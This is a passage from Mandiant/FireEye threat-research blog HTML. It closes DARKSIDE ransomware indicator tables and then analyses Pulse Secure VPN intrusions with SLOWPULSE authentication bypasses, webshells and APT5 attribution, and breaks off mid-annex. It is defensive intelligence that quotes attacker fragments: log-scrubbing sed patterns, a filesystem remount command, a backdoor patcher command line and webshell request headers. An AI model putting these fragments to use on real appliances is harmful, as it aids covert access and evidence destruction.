          DNS Query, Variant #1 </p> </td> </tr>
    <tr>
      <td width="87" valign="bottom"><p>A101-741 </p> </td> <td
        width="553" valign="bottom"><p>Command and Control - DARKSIDE,
          DNS Query, Variant #2 </p> </td> </tr>
    <tr>
      <td width="87" valign="bottom"><p>A101-742 </p> </td> <td
        width="553" valign="bottom"><p>Application Vulnerability -
          SonicWall, CVE-2021-20016, SQL Injection </p> </td> </tr>
    <tr>
      <td width="87" valign="bottom"><p>A104-771 </p> </td> <td
        width="553" valign="bottom"><p>Protected Theater - DARKSIDE,
          PsExec Execution </p> </td> </tr>
    <tr>
      <td width="87" valign="bottom"><p>A104-772 </p> </td> <td
        width="553" valign="bottom"><p>Host CLI - DARKSIDE, Windows
          Share Creation </p> </td> </tr>
    <tr>
      <td width="87" valign="bottom"><p>A104-773 </p> </td> <td
        width="553" valign="bottom"><p>Protected Theater - DARKSIDE,
          Delete Volume Shadow Copy </p> </td> </tr></tbody></table>
 <p>
  <i>Related Indicators</i></p>
 <p>
  <u>UNC2628</u></p>
 <table border="1" cellspacing="0" cellpadding="0" width="624"> <tbody>
    <tr>
      <td width="312" valign="top"><p>
          <b>Indicator</b></p> </td> <td width="312" valign="top"><p>
          <b>Description</b></p> </td> </tr>
    <tr>
      <td width="312" valign="top"><p>104.193.252[.]197:443</p> </td>
        <td width="312" valign="top"><p>BEACON C2</p> </td> </tr>
    <tr>
      <td width="312" valign="top"><p>162.244.81[.]253:443</p> </td> <td
        width="312" valign="top"><p>BEACON C2</p> </td> </tr>
    <tr>
      <td width="312" valign="top"><p>185.180.197[.]86:443</p> </td> <td
        width="312" valign="top"><p>BEACON C2</p> </td> </tr>
    <tr>
      <td width="312" valign="top"><p>athaliaoriginals[.]com</p> </td>
        <td width="312" valign="top"><p>BEACON C2</p> </td> </tr>
    <tr>
      <td width="312" valign="top"><p>lagrom[.]com</p> </td> <td
        width="312" valign="top"><p>BEACON C2</p> </td> </tr>
    <tr>
      <td width="312" valign="top"><p>ctxinit.azureedge[.]net</p> </td>
        <td width="312" valign="top"><p>BEACON C2</p> </td> </tr>
    <tr>
      <td width="312" valign="top"><p>45.77.64[.]111</p> </td> <td
        width="312" valign="top"><p>Login Source</p> </td> </tr>
    <tr>
      <td width="312"
        valign="top"><p>181ab725468cc1a8f28883a95034e17d</p> </td> <td
        width="312" valign="top"><p>BEACON Sample</p> </td> </tr></tbody></table>
 <p>
  <u>UNC2659</u>
  <b></b></p>
 <table border="1" cellspacing="0" cellpadding="0"> <tbody>
    <tr>
      <td width="312" valign="top"><p>Indicator</p> </td> <td
        width="312" valign="top"><p>Description</p> </td> </tr>
    <tr>
      <td width="312" valign="top"><p>173.234.155[.]208</p> </td> <td
        width="312" valign="top"><p>Login Source</p> </td> </tr></tbody></table>
 <p>
  <u>UNC2465</u>
  <b></b></p>
 <table border="1" cellspacing="0" cellpadding="0" width="624"> <tbody>
    <tr>
      <td width="312" valign="top"><p>
          <b>Indicator</b></p> </td> <td width="312" valign="top"><p>
          <b>Description</b></p> </td> </tr>
    <tr>
      <td width="312" valign="top"><p>81.91.177[.]54 :7234</p> </td> <td
        width="312" valign="top"><p>Remote Access</p> </td> </tr>
    <tr>
      <td width="312" valign="top"><p>koliz[.]xyz</p> </td> <td
        width="312" valign="top"><p>File Hosting</p> </td> </tr>
    <tr>
      <td width="312" valign="top"><p>los-web[.]xyz</p> </td> <td
        width="312" valign="top"><p>EMPIRE C2</p> </td> </tr>
    <tr>
      <td width="312" valign="top"><p>sol-doc[.]xyz</p> </td> <td
        width="312" valign="top"><p>Malicious Infrastructure</p> </td> </tr>
    <tr>
      <td width="312"
        valign="top"><p>hxxp://sol-doc[.]xyz/sol/ID-482875588</p> </td>
        <td width="312" valign="top"><p>Downloader URL</p> </td> </tr>
    <tr>
      <td width="312"
        valign="top"><p>6c9cda97d945ffb1b63fd6aabcb6e1a8</p> </td> <td
        width="312" valign="top"><p>Downloader LNK</p> </td> </tr>
    <tr>
      <td width="312"
        valign="top"><p>7c8553c74c135d6e91736291c8558ea8</p> </td> <td
        width="312" valign="top"><p>VBS Launcher</p> </td> </tr>
    <tr>
      <td width="312"
        valign="top"><p>27dc9d3bcffc80ff8f1776f39db5f0a4</p> </td> <td
        width="312" valign="top"><p>Ngrok Utility</p> </td> </tr></tbody></table>
 <p>
  <u>DARKSIDE Ransomware Encryptor<br /> </u></p>
 <table border="1" cellspacing="0" cellpadding="0"> <tbody>
    <tr>
      <td width="312" valign="top"><p>
          <b>DARKSIDE Sample MD5</b></p> </td> </tr>
    <tr>
      <td width="312"
        valign="top"><p>04fde4340cc79cd9e61340d4c1e8ddfb</p> </td> </tr>
    <tr>
      <td width="312"
        valign="top"><p>0e178c4808213ce50c2540468ce409d3</p> </td> </tr>
    <tr>
      <td width="312"
        valign="top"><p>0ed51a595631e9b4d60896ab5573332f</p> </td> </tr>
    <tr>
      <td width="312"
        valign="top"><p>130220f4457b9795094a21482d5f104b</p> </td> </tr>
    <tr>
      <td width="312"
        valign="top"><p>1a700f845849e573ab3148daef1a3b0b</p> </td> </tr>
    <tr>
      <td width="312"
        valign="top"><p>1c33dc87c6fdb80725d732a5323341f9</p> </td> </tr>
    <tr>
      <td width="312"
        valign="top"><p>222792d2e75782516d653d5cccfcf33b</p> </td> </tr>
    <tr>
      <td width="312"
        valign="top"><p>29bcd459f5ddeeefad26fc098304e786</p> </td> </tr>
    <tr>
      <td width="312"
        valign="top"><p>3fd9b0117a0e79191859630148dcdc6d</p> </td> </tr>
    <tr>
      <td width="312"
        valign="top"><p>47a4420ad26f60bb6bba5645326fa963</p> </td> </tr>
    <tr>
      <td width="312"
        valign="top"><p>4d419dc50e3e4824c096f298e0fa885a</p> </td> </tr>
    <tr>
      <td width="312"
        valign="top"><p>5ff75d33080bb97a8e6b54875c221777</p> </td> </tr>
    <tr>
      <td width="312"
        valign="top"><p>66ddb290df3d510a6001365c3a694de2</p> </td> </tr>
    <tr>
      <td width="312"
        valign="top"><p>68ada5f6aa8e3c3969061e905ceb204c</p> </td> </tr>
    <tr>
      <td width="312"
        valign="top"><p>69ec3d1368adbe75f3766fc88bc64afc</p> </td> </tr>
    <tr>
      <td width="312"
        valign="top"><p>6a7fdab1c7f6c5a5482749be5c4bf1a4</p> </td> </tr>
    <tr>
      <td width="312"
        valign="top"><p>84c1567969b86089cc33dccf41562bcd</p> </td> </tr>
    <tr>
      <td width="312"
        valign="top"><p>885fc8fb590b899c1db7b42fe83dddc3</p> </td> </tr>
    <tr>
      <td width="312"
        valign="top"><p>91e2807955c5004f13006ff795cb803c</p> </td> </tr>
    <tr>
      <td width="312"
        valign="top"><p>9d418ecc0f3bf45029263b0944236884</p> </td> </tr>
    <tr>
      <td width="312"
        valign="top"><p>9e779da82d86bcd4cc43ab29f929f73f</p> </td> </tr>
    <tr>
      <td width="312"
        valign="top"><p>a3d964aaf642d626474f02ba3ae4f49b</p> </td> </tr>
    <tr>
      <td width="312"
        valign="top"><p>b0fd45162c2219e14bdccab76f33946e</p> </td> </tr>
    <tr>
      <td width="312"
        valign="top"><p>b278d7ec3681df16a541cf9e34d3b70a</p> </td> </tr>
    <tr>
      <td width="312"
        valign="top"><p>b9d04060842f71d1a8f3444316dc1843</p> </td> </tr>
    <tr>
      <td width="312"
        valign="top"><p>c2764be55336f83a59aa0f63a0b36732</p> </td> </tr>
    <tr>
      <td width="312"
        valign="top"><p>c4f1a1b73e4af0fbb63af8ee89a5a7fe</p> </td> </tr>
    <tr>
      <td width="312"
        valign="top"><p>c81dae5c67fb72a2c2f24b178aea50b7</p> </td> </tr>
    <tr>
      <td width="312"
        valign="top"><p>c830512579b0e08f40bc1791fc10c582</p> </td> </tr>
    <tr>
      <td width="312"
        valign="top"><p>cfcfb68901ffe513e9f0d76b17d02f96</p> </td> </tr>
    <tr>
      <td width="312"
        valign="top"><p>d6634959e4f9b42dfc02b270324fa6d9</p> </td> </tr>
    <tr>
      <td width="312"
        valign="top"><p>e44450150e8683a0addd5c686cd4d202</p> </td> </tr>
    <tr>
      <td width="312"
        valign="top"><p>f75ba194742c978239da2892061ba1b4</p> </td> </tr>
    <tr>
      <td width="312"
        valign="top"><p>f87a2e1c3d148a67eaeb696b1ab69133</p> </td> </tr>
    <tr>
      <td width="312"
        valign="top"><p>f913d43ba0a9f921b1376b26cd30fa34</p> </td> </tr>
    <tr>
      <td width="312"
        valign="top"><p>f9fc1a1a95d5723c140c2a8effc93722</p> </td> </tr></tbody></table>
http://www.fireeye.com/blog/threat-research/2021/05/shining-a-light-on-darkside-ransomware-operations.html2021-05-11T21:30:00.000Z2021-05-21T17:18:13.281ZCheck Your Pulse: Suspected APT Actors Leverage Authentication Bypass
Techniques and Pulse Secure Zero-Daynoemail@noemail.orgDan Perez<h4>Executive Summary</h4>
 <ul> <li>Mandiant recently responded to multiple security incidents
    involving compromises of Pulse Secure VPN appliances.</li> <li>This
    blog post examines multiple, related techniques for bypassing single
    and multifactor authentication on Pulse Secure VPN devices,
    persisting across upgrades, and maintaining access through
  webshells.</li> <li>The investigation by Pulse Secure has determined
    that a combination of prior vulnerabilities and a previously unknown
    vulnerability discovered in April 2021, <a
    href="https://kb.pulsesecure.net/articles/Pulse_Security_Advisories/SA44784/">CVE-2021-22893</a>,
    are responsible for the initial infection vector.</li> <li>Pulse
    Secure’s parent company, Ivanti, released mitigations for a
    vulnerability exploited in relation to these malware families and
    the <a
      href="https://kb.pulsesecure.net/articles/Pulse_Secure_Article/KB44755">Pulse
      Connect Secure Integrity Tool</a> for their customers to determine
    if their systems are impacted. A final patch to address the
    vulnerability will be available in early May 2021.</li> <li>Pulse
    Secure has been working closely with Mandiant, affected customers,
    government partners, and other forensic experts to address these
  issues.</li> <li>There is no indication the identified backdoors were
    introduced through a supply chain compromise of the company’s
    network or software deployment process.</li> </ul>
 <h4>Introduction</h4>
 <p>Mandiant is currently tracking 12 malware families associated with
  the exploitation of Pulse Secure VPN devices. These families are
  related to the circumvention of authentication and backdoor access to
  these devices, but they are not necessarily related to each other and
  have been observed in separate investigations. It is likely that
  multiple actors are responsible for the creation and deployment of
  these various code families.</p>
 <p>The focus of this report is on the activities of UNC2630 against
  U.S. Defense Industrial base (DIB) networks, but detailed malware
  analysis and detection methods for all samples observed at U.S. and
  European victim organizations are provided in the technical annex to
  assist network defenders in identifying a large range of malicious
  activity on affected appliances. Analysis is ongoing to determine the
  extent of the activity.</p>
 <p>Mandiant continues to collaborate with the Ivanti and Pulse Secure
  teams, Microsoft Threat Intelligence Center (MSTIC), and relevant
  government and law enforcement agencies to investigate the threat, as
  well as develop recommendations and mitigations for affected Pulse
  Secure VPN appliance owners.</p>
 <p>As part of their investigation, Ivanti has released mitigations for
  a vulnerability exploited in relation to this campaign as well as the
    <a
    href="https://kb.pulsesecure.net/articles/Pulse_Secure_Article/KB44755">Pulse
    Connect Secure Integrity Tool</a> to assist with determining if
  systems have been impacted.</p>
 <h4>Details</h4>
 <p>Early this year, Mandiant investigated multiple intrusions at
  defense, government, and financial organizations around the world. In
  each intrusion, the earliest evidence of attacker activity traced back
  to DHCP IP address ranges belonging to Pulse Secure VPN appliances in
  the affected environment.</p>
 <p>In many cases, we were not able to determine how actors obtained
  administrator-level access to the appliances. However, based on
  analysis by Ivanti, we suspect some intrusions were due to the
  exploitation of previously disclosed Pulse Secure vulnerabilities from
  2019 and 2020 while other intrusions were due to the exploitation of
    <a href="https://kb.pulsesecure.net/articles/Pulse_Security_Advisories/SA44784/">CVE-2021-22893</a>.</p>
 <p>We observed UNC2630 harvesting credentials from various Pulse Secure
  VPN login flows, which ultimately allowed the actor to use legitimate
  account credentials to move laterally into the affected environments.
  In order to maintain persistence to the compromised networks, the
  actor utilized legitimate, but modified, Pulse Secure binaries and
  scripts on the VPN appliance. This was done to accomplish the following:</p>
 <ol> <li>Trojanize shared objects with malicious code to log
    credentials and bypass authentication flows, including multifactor
    authentication requirements. We track these trojanized assemblies as
    SLOWPULSE and its variants.</li> <li>Inject webshells we currently
    track as RADIALPULSE and PULSECHECK into legitimate
    Internet-accessible Pulse Secure VPN appliance administrative web
    pages for the devices.</li> <li>Toggle the filesystem between
    Read-Only and Read-Write modes to allow for file modification on a
    typically Read-Only filesystem.</li> <li>Maintain persistence across
    VPN appliance general upgrades that are performed by the
  administrator.</li> <li>Unpatch modified files and delete utilities
    and scripts after use to evade detection.</li> <li>Clear relevant
    log files utilizing a utility tracked as THINBLOOD based on an actor
    defined regular expression.</li> </ol>
 <p>In a separate incident in March 2021, we observed UNC2717 using
  RADIALPULSE, PULSEJUMP, and HARDPULSE at a European organization.
  Although we did not observe PULSEJUMP or HARDPULSE used by UNC2630
  against U.S. DIB companies, these malware families have shared
  characteristics and serve similar purposes to other code families used
  by UNC2630. We also observed an OpenSSL library file modified in
  similar fashion as the other trojanized shared objects. We believe
  that the modified library file, which we’ve named LOCKPICK, could
  weaken encryption for communications used by the appliance, but do not
  have enough evidence to confirm this.</p>
 <p>Due to a lack of context and forensic evidence at this time,
  Mandiant cannot associate all the code families described in this
  report to UNC2630 or UNC2717. We also note the possibility that one or
  more related groups is responsible for the development and
  dissemination of these different tools across loosely connected APT
  actors. It is likely that additional groups beyond UNC2630 and UNC2717
  have adopted one or more of these tools. Despite these gaps in our
  understanding, we included detailed analysis, detection techniques,
  and mitigations for all code families in the Technical Annex.</p>
 <h4>SLOWPULSE</h4>
 <p>During our investigation into the activities of UNC2630, we
  uncovered a novel malware family we labeled SLOWPULSE. This malware
  and its variants are applied as modifications to legitimate Pulse
  Secure files to bypass or log credentials in the authentication flows
  that exist within the legitimate Pulse Secure shared object <span
  class="code">libdsplibs.so</span>. Three of the four discovered
  variants enable the attacker to bypass two-factor authentication. A
  brief overview of these variants is covered in this section, refer to
  the Technical Annex for more details.</p>
 <h5>SLOWPULSE Variant 1<i></i></h5>
 <p>This variant is responsible for bypassing LDAP and RADIUS-2FA
  authentication routines if a secret backdoor password is provided by
  the attacker. The sample inspects login credentials used at the start
  of each protocol’s associated routine and strategically forces
  execution down the successful authentication patch if the provided
  password matches the attacker's chosen backdoor password.</p>
 <p>
  <i>LDAP Auth Bypass</i></p>
 <p>The routine <span
  class="code">DSAuth::LDAPAuthServer::authenticate</span> begins the
  LDAP authentication procedure. This variant inserts a check against
  the backdoor password after the bind routine so that the return value
  can be conditionally stomped to spoof successful authentication.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/pulse-secure/fig1.png" alt="" />
  <br /> <span class="type-XS">Figure 1: LDAP Auth Bypass</span></p>
 <p>
  <i>RADIUS Two Factor Auth Bypass</i></p>
 <p>The routine <span
  class="code">DSAuth::RadiusAuthServer::checkUsernamePassword</span>
  begins the RADIUS-2FA authentication procedure. This variant inserts
  checks against the backdoor password after the RADIUS authentication
  packet is received back from the authentication server. If the
  backdoor password is provided by the attacker, the packet type and
  successful authentication status flags are overwritten to spoof
  successful authentication.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/pulse-secure/fig2a.png" alt="" />
  <span class="type-XS">
    <br /> Figure 2: Radius-2FA Bypass</span></p>
 <h5>SLOWPULSE Variant 2</h5>
 <p>
  <i>ACE Two Factor Auth Credential Logging</i></p>
 <p>This variant logs credentials used during the ACE-2FA authentication
  procedure <span
  class="code">DSAuth::AceAuthServer::checkUsernamePassword</span>.
  Rather than bypassing authentication, this variant logs the username
  and password to a file for later use by the attacker.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/pulse-secure/fig3.png" alt="" />
  <br /> <span class="type-XS">Figure 3: ACE Auth Credential Log</span></p>
 <h5>SLOWPULSE Variant 3</h5>
 <p>
  <i>ACE Two Factor Auth Bypass</i></p>
 <p>This variant is responsible for bypassing the ACE-2FA logon
  procedure starting with <span
  class="code">DSAuth::AceAuthServer::checkUsernamePassword</span>. The
  flow of the authentication procedure is modified to bypass the routine
  responsible for verifying the username and password if the backdoor
  password is provided. With this modification the attacker can spoof
  successful authentication.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/pulse-secure/fig4.png" alt="" />
  <br /> <span class="type-XS">Figure 4: ACE Auth Bypass Variant</span></p>
 <h5>SLOWPULSE Variant 4</h5>
 <p>
  <i>RealmSignin Two Factor Auth Bypass</i></p>
 <p>This variant bypasses the <span
  class="code">RealmSignin::runSecondaryAuth</span> procedure of the
  Pulse Secure VPN. The inserted logic modifies the execution flow of a
  specific step of the login process to spoof successful authentication.
  We believe that this may be a two-factor authentication bypass.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/pulse-secure/fig5.png" alt="" />
  <br /> <span class="type-XS">Figure 5: RealmSignIn 2FA Auth Bypass</span></p>
 <h4>Attribution</h4>
 <p>We are in the early stages of gathering evidence and making
  attribution assessments and there are a number of gaps in our
  understanding of UNC2630, UNC2717, and these 12 code families.
  Nevertheless, the Mandiant and Ivanti teams are proactively releasing
  this analysis to assist network defenders in triaging and identifying
  malicious activity on affected appliances.</p>
 <p>Mandiant is able to assess that:</p>
 <ul> <li>UNC2630 targeted U.S. DIB companies with SLOWPULSE,
    RADIALPULSE, THINBLOOD, ATRIUM, PACEMAKER, SLIGHTPULSE, and
    PULSECHECK as early as August 2020 until March 2021.<ul> <li>We
        suspect UNC2630 operates on behalf of the Chinese government and
        may have ties to APT5</li> </ul> </li> <li>UNC2717 targeted
    global government agencies between October 2020 and March 2021 using
    HARDPULSE, QUIETPULSE, AND PULSEJUMP.<ul> <li>We do not have enough
        evidence about UNC2717 to determine government sponsorship or
        suspected affiliation with any known APT group.</li> </ul> </li>
    <li>We do not have enough information about the use of LOCKPICK to
    make an attribution statement.</li> </ul>
 <h5>UNC2630</h5>
 <p>UNC2630’s combination of infrastructure, tools, and on-network
  behavior appear to be unique, and we have not observed them during any
  other campaigns or at any other engagement. Despite these new tools
  and infrastructure, Mandiant analysts noted strong similarities to
  historic intrusions dating back to 2014 and 2015 and conducted by
  Chinese espionage actor APT5. We have also uncovered limited evidence
  to suggest that UNC2630 operates on behalf of the Chinese government.
  Analysis is still ongoing to determine the full scope of the activity
  that maybe related to the group.</p>
 <p>Although we are not able to definitively connect UNC2630 to APT5, or
  any other existing APT group, a trusted third party has uncovered
  evidence connecting this activity to historic campaigns which Mandiant
  tracks as Chinese espionage actor APT5. While we cannot make the same
  connections, the third party assessment is consistent with our
  understanding of APT5 and their historic TTPs and targets.</p>
 <p>APT5 has shown significant interest in compromising networking
  devices and manipulating the underlying software which supports these
  appliances. They have also consistently targeted defense and
  technology companies in the U.S., Europe, and Asia.</p>
 <ul> <li>As early as 2014, Mandiant Incident Response discovered APT5
    making unauthorized code modifications to files in the embedded
    operating system of another technology platform.</li> <li>In 2015,
    APT5 compromised a U.S. telecommunications organization providing
    services and technologies for private and government entities.
    During this intrusion, the actors downloaded and modified some of
    the router images related to the company’s network routers.</li>
    <li>Also during this time, APT5 stole files related to military
    technology from a South Asian defense organization. Observed
    filenames suggest the actors were interested in product
    specifications, emails concerning technical products, procurement
    bids and proposals, and documents on unmanned aerial vehicles
  (UAVs).</li> <li>APT5 persistently targets high value corporate
    networks and often re-compromises networks over many years. Their
    primary targets appear to be aerospace and defense companies located
    in the U.S., Europe, and Asia. Secondary targets (used to facilitate
    access to their primary targets) include network appliance
    manufacturers and software companies usually located in the
  U.S.</li> </ul>
 <h4>Recommendations</h4>
 <p>All Pulse Secure Connect customers should assess the impact of the
  Pulse Secure mitigations and apply it if possible. Organizations
  should utilize the most recent version of Pulse Secure’s Integrity
  Assurance utility <a
  href="https://kb.pulsesecure.net/articles/Pulse_Secure_Article/KB44755">released</a>
  on March 31, 2021. If a device fails this Integrity Assurance utility,
  network administrators should follow the <a
    href="https://kb.pulsesecure.net/articles/Pulse_Secure_Article/KB44755">instructions
  here</a> and contact their Pulse CSR for additional guidance.</p>
 <p>Organizations should examine available forensic evidence to
  determine if an attacker compromised user credentials. Ivanti highly
  recommends resetting all passwords in the environment and reviewing
  the configuration to ensure no service accounts can be used to
  authenticate to the vulnerability.</p>
 <p>Additional detections, mitigations and relevant MITRE ATT&amp;CK
  techniques are included in the Technical Annex. Sample hashes and
  analysis are included to enable defenders to quickly assess if their
  respective appliances have been affected. Yara rules, Snort rules, and
  hashes are published on <a
    href="https://github.com/fireeye/pulsesecure_exploitation_countermeasures/">Mandiant’s
    GitHub page</a>.</p>
 <h4>Detections and Mitigations</h4>
 <p>
  <span class="code">1d3ab04e21cfd40aa8d4300a359a09e3b520d39b1496be1e4bc91ae1f6730ecc</span></p>
 <ul> <li>HARDPULSE contains an embedded 'recovery' URL <span
    class="code">https://ive-host/dana-na/auth/recover[.]cgi?token=&lt;varies&gt;</span>
    that may be accessed by an attacker. The sample uses the POST
    parameters <span class="code">checkcode</span>, <span
    class="code">hashid</span>, <span class="code">m</span>, and <span
    class="code">filename</span>. This URL is not present in legitimate
    versions of this file.</li> </ul>
 <p>
  <span class="code">7fa71a7f76ef63465cfeacf58217e0b66fc71bc81d37c44380a6f572b8a3ec7a</span></p>
 <p>
  <span class="code">68743e17f393d1f85ee937dffacc91e081b5f6f43477111ac96aa9d44826e4d2</span></p>
 <p>
  <span class="code">d72daafedf41d484f7f9816f7f076a9249a6808f1899649b7daa22c0447bb37b</span></p>
 <ul> <li>PULSEJUMP, RADIALPULSE AND PACEMAKER use the following files
    to record credentials:<ul> <li>
        <span
      class="code">/tmp/dsactiveuser.statementcounters</span></li> <li>
        <span class="code">/tmp/dsstartssh.statementcounters</span></li> <li>
        <span
      class="code">/tmp/dsserver-check.statementcounters</span></li>
    </ul> </li> </ul>
 <p>
  <span class="code">cd09ec795a8f4b6ced003500a44d810f49943514e2f92c81ab96c33e1c0fbd68</span></p>
 <ul> <li>The malicious operations of SLOWPULSE can be detected via log
    correlation between the authentication servers responsible for LDAP
    and RADIUS auth and the VPN server. Authentication failures in
    either LDAP or RADIUS logs with the associated VPN logins showing
    success would be an anomalous event worthy of flagging.</li> </ul>
 <p>
  <span class="code">a1dcdf62aafc36dd8cf64774dea80d79fb4e24ba2a82adf4d944d9186acd1cc1</span></p>
 <ul> <li>Upon invocation of the PULSECHECK webshell, the following HTTP
    request headers will be sent:</li> </ul>
 <table border="0" cellspacing="0" cellpadding="0" width="472"> <tbody>
    <tr>
      <td width="178"><p>
          <b>Key</b></p> </td> <td width="294"><p>
          <b>Value</b></p> </td> </tr>
    <tr>
      <td width="178"><p>
          <span class="code">REQUEST_METHOD</span></p> </td> <td width="294"><p>
          <span class="code">POST</span></p> </td> </tr>
    <tr>
      <td width="178"><p>
          <span class="code">HTTP_X_KEY</span></p> </td> <td width="294"><p>
          <span class="code">&lt;BackdoorKey&gt;</span></p> </td> </tr>
    <tr>
      <td width="178"><p>
          <span class="code">HTTP_X_CNT</span></p> </td> <td width="294"><p>
          <span class="code">&lt;RC4Key&gt;</span></p> </td> </tr>
    <tr>
      <td width="178"><p>
          <span class="code">HTTP_X_CMD</span></p> </td> <td width="294"><p>
          <span class="code">&lt;RC4Command&gt;</span></p> </td> </tr></tbody></table>
 <p>
  <span class="code">1ab50b77dd9515f6cd9ed07d1d3176ba4627a292dc4a21b16ac9d211353818bd</span></p>
 <ul> <li>SLOWPULSE VARIANT 2 writes ACE logon credentials to the
      file <span class="code">/home/perl/PAUS.pm</span> in <span
    class="code">a+</span> (append) mode, using the format string <span
  class="code">%s:%s\n</span>.</li> </ul>
 <p>
  <span class="code">68743e17f393d1f85ee937dffacc91e081b5f6f43477111ac96aa9d44826e4d2</span></p>
 <ul> <li>PACEMAKER is saved at filepath <span
  class="code">/home/bin/memread</span></li> <li>Executed with
    commandline flags <span class="code">–t</span>, <span
    class="code">-m</span>, <span class="code">-s</span></li>
    <li>Attaches to victim processes with PTRACE and opens subfiles in
      <span class="code">/proc/</span></li> </ul>
 <p>
  <span class="code">88170125598a4fb801102ad56494a773895059ac8550a983fdd2ef429653f079</span></p>
 <ul> <li>THINBLOOD creates the files:<ul> <li>
        <span class="code">/home/runtime/logs/log.events.vc1</span></li> <li>
        <span class="code">/home/runtime/logs/log.events.vc2</span></li> <li>
        <span class="code">/home/runtime/logs/log.access.vc1</span></li> <li>
        <span class="code">/home/runtime/logs/log.access.vc2</span></li>
    </ul> </li> <li>Executes the <span class="code">system</span> API
    with the <span class="code">mv</span> command specifying one of the
    files above, targeting:<ul> <li>
        <span class="code">/home/runtime/logs/log.access.vc0</span></li> <li>
        <span class="code">/home/runtime/logs/log.events.vc0</span></li>
    </ul> </li> <li>Executes the <span class="code">rm</span> command
    specify one of the <span class="code">.vc1</span> files above</li> </ul>
 <p>
  <span class="code">133631957d41eed9496ac2774793283ce26f8772de226e7f520d26667b51481a</span></p>
 <ul> <li>SLIGHTPULSE uses <span class="code">/tmp/1</span> as command
    execution log</li> <li>All POST requests to <span
    class="code">meeting_testjs.cgi</span> are suspicious</li> <li>POST
    parameters: <span class="code">cert</span>, <span
    class="code">img</span>, <span class="code">name</span> are used by
    malicious logic</li> <li>Responses to the endpoint with the <span
    class="code">name</span> parameter respond with <span
    class="code">no-cache</span> and <span
  class="code">image/gif</span></li> </ul>
 <p>
  <span class="code">1741dc0a491fcc8d078220ac9628152668d3370b92a8eae258e34ba28c6473b9</span></p>
 <ul> <li>THINBLOOD execution of sed on the files:<ul> <li>
        <span class="code">log.events.vc0</span></li> <li>
        <span class="code">log.access.vc0</span></li> <li>
        <span class="code">Log.admin.vc0</span></li> </ul> </li> <li>Sed
    patterns used:<ul> <li>
        <span
      class="code">s/.\x00[^\x00]*&lt;regex_string&gt;[^\x00]*\x09.\x00//g</span></li> <li>
        <span
      class="code">s/\x&lt;hex_char&gt;\x00[^\x00]*&lt;regex_string&gt;[^\x00]*\x09\x&lt;hex_char&gt;\x00//g</span></li>
    </ul> </li> </ul>
 <p>
  <span class="code">06c56bd272b19bf7d7207443693cd1fc774408c4ca56744577b11fee550c23f7</span></p>
 <ul> <li>The sample accepts an input and output file as its first and
    second arguments, then writes a patched version of the input out.
    The commandline argument e or E must be supplied as the fourth
    argument. Example command line:<ul> <li>
        <span class="code">./patcher input.bin output.bin backdoorkey
      e</span></li> </ul> </li> </ul>
 <p>
  <span class="code">f2b1bd703c3eb05541ff84ec375573cbdc70309ccb82aac04b72db205d718e90</span></p>
 <ul> <li>The sample uses the HTTP query parameter id and responds with
    HTTP headers &quot;Cache-Control: no-cache\n&quot; and
    &quot;Content-type: text/html\n\n&quot;.</li> </ul>
 <p>
  <span class="code">224b7c45cf6fe4547d3ea66a12c30f3cb4c601b0a80744154697094e73dbd450</span></p>
 <p>
  <span class="code">64c87520565165ac95b74d6450b3ab8379544933dd3e2f2c4dc9b03a3ec570a7</span></p>
 <p>
  <span class="code">78d7c7c9f800f6824f63a99d935a4ad0112f97953d8c100deb29dae24d7da282</span></p>
 <p>
  <span class="code">705cda7d1ace8f4adeec5502aa311620b8d6c64046a1aed2ae833e2f2835154f</span></p>
 <ul> <li>Execute sed on PulseSecure system files</li> <li>Remounts
    filesystem as writable: <span class="code">system(&quot;/bin/mount
      -o remount,rw /dev/root /&quot;)</span></li> <li>Unexpected
    execution of other system commands such as <span
    class="code">tar</span>, <span class="code">cp</span>, <span
  class="code">rm</span></li> </ul>
 <h4>MITRE ATT&amp;CK Techniques</h4>
 <p>The following list of MITRE ATT&amp;CK techniques cover all malware
  samples described in this report as well as those observed throughout
  the lifecycle of UNC2630 and UNC2717.</p>
 <ul> <li>T1003-OS Credential Dumping</li> <li>T1016-System Network
    Configuration Discovery</li> <li>T1021.001-Remote Desktop
  Protocol</li> <li>T1027-Obfuscated Files or Information</li>
    <li>T1036.005-Match Legitimate Name or Location</li>
    <li>T1048-Exfiltration Over Alternative Protocol</li>
    <li>T1049-System Network Connections Discovery</li>
    <li>T1053-Scheduled Task/Job</li> <li>T1057-Process Discovery</li>
    <li>T1059-Command and Scripting Interpreter</li>
    <li>T1059.003-Windows Command Shell</li> <li>T1070-Indicator Removal
    on Host</li> <li>T1070.001-Clear Windows Event Logs</li>
    <li>T1070.004-File Deletion</li> <li>T1071.001-Web Protocols</li>
    <li>T1082-System Information Discovery</li> <li>T1098-Account
  Manipulation</li> <li>T1105-Ingress Tool Transfer</li>
    <li>T1111-Two-Factor Authentication Interception</li>
    <li>T1133-External Remote Services</li> <li>T1134.001 Access Token
    Manipulation: Token Impersonation/Theft</li> <li>T1136-Create
  Account</li> <li>T1140-Deobfuscate/Decode Files or Information</li>
    <li>T1190-Exploit Public-Facing Application</li> <li>T1505.003-Web
  Shell</li> <li>T1518-Software Discovery</li> <li>T1554-Compromise
    Client Software Binary</li> <li>T1556.004-Network Device
  Authentication</li> <li>T1592.004 Gather Victim Host Information:
    Client Configurations</li> <li>T1562 Impair Defenses</li>
    <li>T1569.002-Service Execution</li> <li>T1574 Hijack Execution
  Flow </li> <li>T1600-Weaken Encryption</li> </ul>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/pulse-secure/fig6.png" alt="" />
  <br /> <span class="type-XS">Figure 6: MITRE ATT&amp;CK Map</span></p>
 <h4>Technical Annex</h4>
 <h5>SLIGHTPULSE</h5>
 <p>The file <span class="code">meeting_testjs.cgi</span> (SHA256: <span
  class="code">133631957d41eed9496ac2774793283ce26f8772de226e7f520d26667b51481a</span>)
  is a webshell capable of arbitrary file read, write, and command
  execution. Malicious logic is inserted at the end of legitimate logic
  to respond to POST requests. We believe this webshell may be
  responsible for placing additional webshells and used to modify
  legitimate system components resulting in the other observed malware
  families due to its functionality.</p>
 <p>The malicious logic inserts a branch condition to respond to HTTP
  POST requests rather than just the typical GET requests expected of
  the legitimate code. If GET requests are performed the legitimate
